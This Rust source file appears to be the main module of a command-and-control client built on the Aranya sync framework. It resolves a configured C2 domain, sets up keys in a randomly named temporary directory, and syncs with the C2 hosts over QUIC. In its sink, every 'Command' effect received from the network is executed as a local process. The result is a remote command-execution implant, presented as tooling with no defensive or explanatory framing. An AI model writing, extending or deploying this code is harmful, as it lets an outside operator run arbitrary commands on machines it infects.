mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
    path::{Path, PathBuf},
    fs
};
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::BaseId;
use s2n_quic::Client;
use tokio::{time::{Duration, sleep}};
use crate::{c2syncer::{AM, C2Syncer, c2push, c2sync, new_quic_client, run_c2syncer}, common::C2Client};
use tokio::sync::Mutex;
use chrono::prelude::*;
use rand::{RngExt, seq::IndexedRandom};

struct C2Sink {
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        if effect.name == "Command" {
            if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
                print!("COMMAND:{}\n", s.trim());
                let out = std::process::Command::new(s.trim()).output().expect("Error exec command");
                let stdout = String::from_utf8(out.stdout).expect("Output string fail");
            }
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn generate_random_directory() -> PathBuf {
    let mut randdir = [0u8; 10];

    let mut rng = rand::rng();
    for i in 0..10 {
        randdir[i] = rng.sample(rand::distr::Alphanumeric);
    }

    return std::env::temp_dir()
        .join(Path::new(std::str::from_utf8(&randdir).unwrap()));
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt().init();

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
    
    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);

    // TODO: TEMPORARY
    let args: Vec<String> = std::env::args().collect();
    let bind: SocketAddr = args[1].parse().expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");
    // TODO: END TEMPORARY

    // Generate random directory
    let basedir = generate_random_directory();

    let _ = fs::create_dir(&basedir);

    let sink = C2Sink {};

    let mut aranya = C2Client::new(&basedir);
    let keys = aranya.create_new_keys();
    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let mut cs = aranya.init_aranya(policy);

    let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
    aranya.set_graph(graph);

    let mut syncer = C2Syncer::new(cs, sink);

    for host in ips {
        syncer.connections.push(
            SocketAddr::new(host, config::PORT)
        );
    }

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async move {
        let quic = {
            let mut syncbind = bind.clone();
            syncbind.set_port(4446);
            new_quic_client(syncbind)
        };

       tokio::spawn(
            run_c2syncer(
                syncer,
                quic,
                bind
            )
        );

        // TODO: Nicer way to represent infinite loop ?
        loop {
            sleep(Duration::from_millis(100000)).await;
        }
    });
}
